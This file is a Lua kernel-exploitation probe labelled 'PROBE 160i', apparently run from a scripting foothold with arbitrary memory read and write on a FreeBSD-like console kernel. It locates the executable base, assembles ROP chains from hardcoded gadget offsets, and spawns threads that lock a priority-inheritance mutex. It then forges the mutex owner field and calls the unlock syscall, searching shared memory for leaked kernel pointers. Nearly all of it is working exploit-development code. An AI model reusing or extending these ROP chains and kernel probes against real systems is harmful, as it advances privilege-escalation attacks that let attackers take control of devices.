-- CRASH_CLASS: MODERATE
-- PROBE 160i: PI ownership fraud — unlock from fake owner
--
-- The kernel's UNLOCK checks m_owner == caller TID. If main overwrites
-- m_owner with its own TID while child A is the real PI-chain owner, main's
-- UNLOCK succeeds but the PI chain references child A's structures.
--
-- Test A: child LOCKs → main overwrites m_owner → main UNLOCKs (op 6)
-- Test B: child LOCKs → child B LOCKs (blocks on A) → main overwrites →
--         main UNLOCKs → B should wake with corrupt PI handoff
-- Test C: same as B but main writes CONTESTED|main_TID before unlock
--
-- Children nanosleep(1s) then thr_exit to avoid thread exhaustion.

print("=== PROBE 160i: PI OWNERSHIP FRAUD ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

-- Ignore signals
local sc_sigaction = mk(416)
local act_buf = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act_buf) + off, 0) end
for sig = 1, 31 do
    if sig ~= 9 then
        wq(N(act_buf), uint64(1)); wd(N(act_buf) + 8, 0)
        pcall(function() sc_sigaction(uint64(sig), act_buf, uint64(0), uint64(0), uint64(0), uint64(0)) end)
    end
end
print("signals ignored")

-- Get main TID
local tid_out = memory.alloc(8)
pcall(function() mk(432)(tid_out) end)
local main_tid = rd(N(tid_out)) or 0
print(string.format("main_tid=0x%X", main_tid))

-- Shared memory
local shared = memory.alloc(0x400)
local MUTEX   = N(shared)
local A_SENT  = N(shared) + 0x10
local A_EXIT  = N(shared) + 0x18
local B_SENT  = N(shared) + 0x20
local B_RET   = N(shared) + 0x28
local B_EXIT  = N(shared) + 0x30

-- Timespecs
local ts_1s = memory.alloc(16)
wq(N(ts_1s), uint64(1))
wq(N(ts_1s) + 8, uint64(0))

local stk = memory.alloc(0x10000)
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local sc_umtx = mk(454)

local function cp(base, p, val)
    wq(base + p, val)
    return p + 8
end

local function spawn(chain_base)
    local BC = N(ctx)
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480); wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43); wd(BC + 0x100, 0x3B)
    wd(BC + 0xE0, rip_lo); wd(BC + 0xE4, rip_hi)
    local rsp_lo = chain_base % 0x100000000
    local rsp_hi = math.floor(chain_base / 0x100000000)
    wd(BC + 0xF8, rsp_lo); wd(BC + 0xFC, rsp_hi)
    wq(N(tid_buf), uint64("0x0"))
    pcall(function() mk(430)(ctx, tid_buf, uint64(0)) end)
    return rq(N(tid_buf))
end

local function check_kptr(addr, len)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR +0x%X: %s ***", off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

local function zero_shared()
    for off = 0, 0x3F, 4 do wd(N(shared) + off, 0) end
end

local function wait_sent(addr, max)
    max = max or 100000
    for i = 1, max do
        local v = rq(addr)
        if v and N(v) ~= 0 then return true end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    return false
end

local function wait_exit(addr, max)
    max = max or 200000
    for i = 1, max do
        if (rd(addr) or 0) ~= 0 then return true end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    return false
end

-- Build child chain: LOCK → sentinel → nanosleep(1s) → thr_exit
local function build_lock_sleep_exit(base, sent_addr, exit_addr)
    local p = 0
    -- LOCK
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(454))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", MUTEX)))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(5))
    p = cp(base, p, sa)
    -- sentinel
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", sent_addr)))
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64("0xAAAA"))
    p = cp(base, p, eaddr(G.mov_w))
    -- nanosleep(1s)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(240))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", N(ts_1s))))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(0))
    p = cp(base, p, sa)
    -- thr_exit
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(431))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", exit_addr)))
    p = cp(base, p, sa)
    return p
end

-- Build child chain: LOCK (will block) → store ret → sentinel → nanosleep(1s) → thr_exit
local function build_lock_block_exit(base, ret_addr, sent_addr, exit_addr)
    local p = 0
    -- LOCK (will block if mutex held)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(454))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", MUTEX)))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(5))
    p = cp(base, p, sa)
    -- store return
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", ret_addr)))
    p = cp(base, p, eaddr(G.mov_w))
    -- sentinel
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", sent_addr)))
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64("0xBBBB"))
    p = cp(base, p, eaddr(G.mov_w))
    -- nanosleep(1s)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(240))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", N(ts_1s))))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(0))
    p = cp(base, p, sa)
    -- thr_exit
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(431))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", exit_addr)))
    p = cp(base, p, sa)
    return p
end

local total_kptr = 0
local total_anomaly = 0

-- =============================================
-- TEST A: child LOCKs → main overwrites m_owner → main UNLOCKs
-- =============================================
print("")
print("[A] Ownership fraud: overwrite + unlock (10 rounds)")

for round = 1, 10 do
    if not alive() then print(string.format("  R%d: DIED", round)); break end
    zero_shared()

    local CA = N(stk) + 0x2000
    build_lock_sleep_exit(CA, A_SENT, A_EXIT)
    spawn(CA)

    if not wait_sent(A_SENT, 50000) then
        print(string.format("  R%d: A timeout", round))
        wd(MUTEX, 0)
    else
        local a_tid_val = rd(MUTEX) or 0

        -- Overwrite m_owner with main's TID
        wd(MUTEX, main_tid)

        -- Main UNLOCKs (op 6)
        local uret = nil
        local uok = pcall(function()
            uret = sc_umtx(uint64(MUTEX), uint64(6), uint64(0), uint64(0), uint64(0))
        end)

        local m_after = rd(MUTEX) or 0
        local kp = check_kptr(N(shared), 0x40)
        total_kptr = total_kptr + kp

        local anomaly = false
        if not uok then anomaly = true end
        if kp > 0 then anomaly = true end

        if anomaly then
            total_anomaly = total_anomaly + 1
            print(string.format("  R%d: *** ANOMALY *** a=0x%X uok=%s uret=%s m=0x%X kp=%d",
                round, a_tid_val, tostring(uok), fmt(uret), m_after, kp))
        else
            print(string.format("  R%d: a=0x%X uret=%s m=0x%X",
                round, a_tid_val, fmt(uret), m_after))
        end

        wd(MUTEX, 0)
    end

    -- Wait for child A to exit before next round
    wait_exit(A_EXIT, 200000)
end

-- =============================================
-- TEST B: A LOCKs → B LOCKs (blocks) → main overwrites → main UNLOCKs → B wakes?
-- =============================================
print("")
print("[B] Fraud with blocked waiter (5 rounds)")

for round = 1, 5 do
    if not alive() then print(string.format("  R%d: DIED", round)); break end
    zero_shared()

    -- Child A: LOCK → sentinel → sleep → exit
    local CA = N(stk) + 0x2000
    build_lock_sleep_exit(CA, A_SENT, A_EXIT)
    spawn(CA)

    if not wait_sent(A_SENT, 50000) then
        print(string.format("  R%d: A timeout", round))
        wd(MUTEX, 0)
    else
        local a_own = rd(MUTEX) or 0

        -- Child B: LOCK (blocks on A) → sentinel → sleep → exit
        local CB = N(stk) + 0x6000
        build_lock_block_exit(CB, B_RET, B_SENT, B_EXIT)
        spawn(CB)

        -- Give B time to enter LOCK and block
        for i = 1, 5000 do native.fcall_with_rax(stub, 20) end

        -- B should NOT have sentinel yet (blocked on A)
        local b_pre = rq(B_SENT)

        -- Overwrite m_owner with main's TID
        wd(MUTEX, main_tid)

        -- Main UNLOCKs (op 6) — kernel processes unlock, should wake B
        local uret = nil
        local uok = pcall(function()
            uret = sc_umtx(uint64(MUTEX), uint64(6), uint64(0), uint64(0), uint64(0))
        end)

        -- Give B time to wake
        local b_woke = wait_sent(B_SENT, 50000)
        local m_after = rd(MUTEX) or 0
        local b_ret_val = rq(B_RET)
        local kp = check_kptr(N(shared), 0x40)
        total_kptr = total_kptr + kp

        local anomaly = false
        if not uok then anomaly = true end
        if kp > 0 then anomaly = true end

        if anomaly then
            total_anomaly = total_anomaly + 1
            print(string.format("  R%d: *** ANOMALY *** a=0x%X uret=%s b_woke=%s m=0x%X bret=%s kp=%d",
                round, a_own, fmt(uret), tostring(b_woke), m_after, fmt(b_ret_val), kp))
        else
            print(string.format("  R%d: a=0x%X uret=%s bpre=%s bwoke=%s m=0x%X bret=%s",
                round, a_own, fmt(uret), fmt(b_pre), tostring(b_woke), m_after, fmt(b_ret_val)))
        end

        wd(MUTEX, 0)
        -- Wake any stuck waiter
        pcall(function() sc_umtx(uint64(MUTEX), uint64(18), uint64(0x7FFFFFFF), uint64(0), uint64(0)) end)
    end

    -- Wait for both children to exit
    wait_exit(A_EXIT, 200000)
    wait_exit(B_EXIT, 200000)
end

-- =============================================
-- TEST C: Fraud with CONTESTED bit + waiter
-- =============================================
print("")
print("[C] CONTESTED fraud + waiter (5 rounds)")

local CONTESTED = 0x80000000

for round = 1, 5 do
    if not alive() then print(string.format("  R%d: DIED", round)); break end
    zero_shared()

    local CA = N(stk) + 0x2000
    build_lock_sleep_exit(CA, A_SENT, A_EXIT)
    spawn(CA)

    if not wait_sent(A_SENT, 50000) then
        print(string.format("  R%d: A timeout", round))
        wd(MUTEX, 0)
    else
        local a_own = rd(MUTEX) or 0

        local CB = N(stk) + 0x6000
        build_lock_block_exit(CB, B_RET, B_SENT, B_EXIT)
        spawn(CB)

        for i = 1, 5000 do native.fcall_with_rax(stub, 20) end

        -- Write CONTESTED | main_tid
        local fraud_val = main_tid + CONTESTED
        if fraud_val < 0 then fraud_val = fraud_val + 0x100000000 end
        wd(MUTEX, fraud_val)

        -- Main UNLOCKs — kernel sees CONTESTED, should process waiter handoff
        local uret = nil
        local uok = pcall(function()
            uret = sc_umtx(uint64(MUTEX), uint64(6), uint64(0), uint64(0), uint64(0))
        end)

        local b_woke = wait_sent(B_SENT, 50000)
        local m_after = rd(MUTEX) or 0
        local b_ret_val = rq(B_RET)
        local kp = check_kptr(N(shared), 0x40)
        total_kptr = total_kptr + kp

        local anomaly = false
        if not uok then anomaly = true end
        if kp > 0 then anomaly = true end

        if anomaly then
            total_anomaly = total_anomaly + 1
            print(string.format("  R%d: *** ANOMALY *** a=0x%X uret=%s bwoke=%s m=0x%X bret=%s kp=%d",
                round, a_own, fmt(uret), tostring(b_woke), m_after, fmt(b_ret_val), kp))
        else
            print(string.format("  R%d: a=0x%X uret=%s bwoke=%s m=0x%X bret=%s",
                round, a_own, fmt(uret), tostring(b_woke), m_after, fmt(b_ret_val)))
        end

        wd(MUTEX, 0)
        pcall(function() sc_umtx(uint64(MUTEX), uint64(18), uint64(0x7FFFFFFF), uint64(0), uint64(0)) end)
    end

    wait_exit(A_EXIT, 200000)
    wait_exit(B_EXIT, 200000)
end

print("")
print(string.format("TOTAL: anomalies=%d kptr=%d", total_anomaly, total_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 160i COMPLETE ===")
